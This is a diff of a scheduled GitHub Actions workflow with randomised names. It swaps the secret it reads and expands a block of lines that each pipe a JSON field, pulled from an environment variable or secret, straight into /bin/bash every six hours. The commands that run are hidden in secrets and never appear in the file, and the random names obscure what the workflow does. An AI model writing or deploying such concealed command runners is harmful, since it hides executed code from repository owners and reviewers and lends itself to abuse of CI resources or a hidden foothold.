@@ -3,22 +3,29 @@ name: gaoshoz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 0/6 * * *'
+    - cron: '18 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gaoshoz
         env:
-          q2464: ${{ secrets.q2464 }}
+          l32889: ${{ secrets.l32889 }}
         run: |
-          echo $q2464 | jq -r .llz305 | /bin/bash
-          echo $thxb1246 | jq -r .i62644 | /bin/bash
-          echo $vfrs2021 | jq -r .nayxc54 | /bin/bash
-          echo $yupk153 | jq -r .tf19743 | /bin/bash
-          echo $c2 | jq -r .trdtq473 | /bin/bash
-          echo $sk8652 | jq -r .cmmlh6 | /bin/bash
-          echo $e083 | jq -r .ia8270 | /bin/bash
+          echo $l32889 | jq -r .j464 | /bin/bash
+          echo $no33283 | jq -r .mas72 | /bin/bash
+          echo $tmwy567 | jq -r .eoi3 | /bin/bash
+          echo $agu557 | jq -r .hxybt73372 | /bin/bash
+          echo $gb7270 | jq -r .di6 | /bin/bash
+          echo $xygcw4 | jq -r .zv86 | /bin/bash
+          echo $zg1538 | jq -r .gsje89814 | /bin/bash
+          echo $hoe62486 | jq -r .ruf65 | /bin/bash
+          echo $jkfez4122 | jq -r .ipsu252 | /bin/bash
+          echo $iu550 | jq -r .fj732 | /bin/bash
+          echo $keany3 | jq -r .divny23 | /bin/bash
+          echo $ed73814 | jq -r .upa73 | /bin/bash
+          echo $jvo033 | jq -r .q93658 | /bin/bash
+          echo $fjcml2666 | jq -r .fpgi85 | /bin/bash
+          echo $cpey6338 | jq -r .dvcnu609 | /bin/bash
 
